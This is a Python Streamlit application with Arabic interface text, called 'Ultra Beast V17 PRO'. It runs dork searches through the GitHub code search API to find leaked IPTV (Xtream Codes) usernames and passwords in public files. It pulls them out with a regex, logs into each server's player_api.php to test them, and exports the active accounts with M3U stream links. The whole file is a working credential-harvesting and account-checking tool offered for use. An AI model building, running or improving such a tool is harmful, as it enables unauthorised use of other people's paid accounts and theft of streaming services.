import streamlit as st
import requests
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =================================================
# 1. إعدادات الأمان
# =================================================
LOGIN_PASSWORD = "BEAST_V17_PRO" 

def check_password():
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False
    if st.session_state.password_correct:
        return True

    st.markdown("<h2 style='text-align: center; color:#00ff41;'>🌪️ Ultra Beast V17 PRO</h2>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كلمة المرور الخاصة بالإصدار 17:", type="password")
    if st.button("دخول"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else:
            st.error("❌ خطأ في كلمة المرور!")
    return False

if not check_password():
    st.stop()

# =================================================
# 2. إعدادات الواجهة
# =================================================
st.set_page_config(page_title="Ultra Beast V17 PRO", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #0c0e12; }
    .card {
        background: #14161a;
        border: 1px solid #2d323b;
        border-right: 5px solid #00ff41;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 10px;
    }
    .host-text { color: #00ff41; font-weight: bold; font-family: monospace; }
    .country-tag { background: #333; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 10px; }
    .live-log { color: #fbbf24; font-family: monospace; font-size: 12px; }
</style>
""", unsafe_allow_html=True)

if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()

# إنشاء جلسة متصفح وهمية قوية لتخطي الحماية
if 'req_session' not in st.session_state:
    st.session_state.req_session = requests.Session()
    st.session_state.req_session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    })

# =================================================
# 3. محرك الفحص والبيانات
# =================================================

def is_valid_syntax(host, user, pw):
    bad_words = ['localhost', '127.0.0.1', 'your-ip', 'domain', 'example', 'server']
    bad_users = ['user', 'test', 'username', 'pass', 'password', 'x']
    if any(w in host.lower() for w in bad_words) or user.lower() in bad_users or pw.lower() in bad_users:
        return False
    return True

def get_country(host):
    try:
        ip = host.split('//')[-1].split(':')[0]
        res = st.session_state.req_session.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        return res.get('country', 'Unknown')
    except: return "Global"

def check_account(host, user, pw):
    if not is_valid_syntax(host, user, pw): return None
    
    unique_key = f"{host}|{user}"
    if unique_key in st.session_state.seen_urls: return None
    st.session_state.seen_urls.add(unique_key)

    try:
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        # فحص السيرفر
        r = st.session_state.req_session.get(api_url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("user_info", {}).get("status") == "Active":
                info = data["user_info"]
                exp_date = info.get('exp_date')
                exp = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d') if exp_date and str(exp_date).isdigit() else "Unlimited"
                country = get_country(host)
                m3u_link = f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
                
                return {
                    "host": host, "user": user, "pass": pw, 
                    "exp": exp, "conn": f"{info.get('active_cons', '0')}/{info.get('max_connections', '1')}",
                    "country": country, "m3u": m3u_link
                }
    except:
        return None
    return None

# =================================================
# 4. واجهة التحكم والتحميل
# =================================================
with st.sidebar:
    st.title("🌪️ BEAST V17")
    token = st.text_input("GitHub Token:", type="password")
    
    if st.button("🚀 ابدأ الصيد المليوني"):
        if token: 
            st.session_state.is_hunting = True
            st.rerun()
        else: st.warning("ضع التوكن أولاً!")
    
    if st.button("🛑 توقف"):
        st.session_state.is_hunting = False
        st.rerun()

    st.divider()
    
    stat_check = st.empty()
    stat_found = st.empty()
    stat_check.metric("🔍 تم استخراج/فحص", st.session_state.checked_count)
    stat_found.metric("💎 صيد صالح", len(st.session_state.results))
    
    if st.session_state.results:
        st.subheader("📥 تحميل الصيد")
        export_data = ""
        for item in st.session_state.results:
            export_data += f"COUNTRY: {item['country']}\nHOST: {item['host']}\nUSER: {item['user']}\nPASS: {item['pass']}\nEXP: {item['exp']}\nM3U: {item['m3u']}\n" + "-"*30 + "\n"
        
        st.download_button(
            label="تحميل ملف النتائج .txt",
            data=export_data,
            file_name=f"Beast_Hunt_{datetime.now().strftime('%H-%M')}.txt",
            mime="text/plain"
        )

# =================================================
# 5. منطقة العرض المباشر
# =================================================
st.subheader("📡 الرادار المباشر")
status_log = st.empty()
live_action = st.empty() # شاشة المراقبة الحية الجديدة
results_area = st.empty()

def render_display():
    stat_check.metric("🔍 تم استخراج/فحص", st.session_state.checked_count)
    stat_found.metric("💎 صيد صالح", len(st.session_state.results))
    
    html_content = ""
    for item in st.session_state.results:
        html_content += f"""
        <div class="card">
            <div style="display:flex; justify-content:space-between;">
                <span class="host-text">{item['host']}</span>
                <span class="country-tag">🌍 {item['country']}</span>
            </div>
            <div style="margin-top:10px; font-size:14px; color:#ccc;">
                <b>USER:</b> {item['user']} | <b>PASS:</b> {item['pass']} <br>
                <b>EXP:</b> <span style="color:#ffa500;">{item['exp']}</span> | <b>CONN:</b> {item['conn']}
            </div>
            <div style="background:#000; padding:5px; margin-top:5px; border-radius:4px; font-size:11px; color:#00ff41; overflow-x:auto;">
                M3U: {item['m3u']}
            </div>
        </div>
        """
    results_area.markdown(html_content, unsafe_allow_html=True)

if not st.session_state.is_hunting:
    render_display()

if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    dorks = [
        '"player_api.php" user pass extension:txt',
        'extension:txt "get.php?username="', 
        '"http://" "password=" extension:m3u',
        'xtream codes iptv 2026'
    ]
    
    while st.session_state.is_hunting:
        for dork in dorks:
            if not st.session_state.is_hunting: break
            
            for page in range(1, 15):
                if not st.session_state.is_hunting: break
                
                status_log.info(f"🔎 جاري مسح جيت هاب: {dork} | صفحة {page}")
                live_action.markdown("<span class='live-log'>⏳ بانتظار استجابة جيت هاب...</span>", unsafe_allow_html=True)
                
                try:
                    url = f"https://api.github.com/search/code?q={dork}&per_page=100&page={page}"
                    res = requests.get(url, headers=headers).json()
                    
                    if "message" in res and "rate limit" in res["message"].lower():
                        status_log.warning("⏳ جيت هاب يطلب الانتظار (Rate Limit)... سيستأنف بعد 20 ثانية.")
                        for i in range(20, 0, -1):
                            if not st.session_state.is_hunting: break
                            live_action.markdown(f"<span class='live-log'>العد التنازلي: {i} ثانية...</span>", unsafe_allow_html=True)
                            time.sleep(1)
                        continue 
                    
                    items = res.get('items', [])
                    if not items: 
                        live_action.markdown("<span class='live-log'>⚠️ الصفحة فارغة، جاري الانتقال...</span>", unsafe_allow_html=True)
                        break 
                    
                    for item in items:
                        if not st.session_state.is_hunting: break
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        
                        try:
                            # جلب محتوى الملف
                            content = requests.get(raw_url, timeout=4).text
                            # Regex مطور جداً لصيد السيرفرات
                            matches = re.findall(r"(http[s]?://[a-zA-Z0-9\.\-]+:\d+)[^\"'\s]*\?username=([^&\"'\s]+)&password=([^&\"'\s]+)", content)
                            
                            for m in matches:
                                host, user, pwd = m[0], m[1], m[2]
                                
                                # عرض السيرفر الذي يتم فحصه حالياً على الشاشة
                                live_action.markdown(f"<span class='live-log'>⚡ يتم الآن فحص: {host} | {user}</span>", unsafe_allow_html=True)
                                
                                st.session_state.checked_count += 1
                                render_display() # لتحديث العداد
                                
                                found = check_account(host, user, pwd)
                                if found:
                                    st.session_state.results.insert(0, found)
                                    render_display()
                        except Exception as e:
                            continue
                    
                    time.sleep(2)
                except Exception as e:
                    live_action.markdown(f"<span class='live-log'>❌ خطأ في الاتصال: {e}</span>", unsafe_allow_html=True)
                    time.sleep(5)
                    continue
                
        status_log.success("🔄 تم مسح جميع الكلمات، جاري إعادة تدوير الرادار...")
        time.sleep(5)
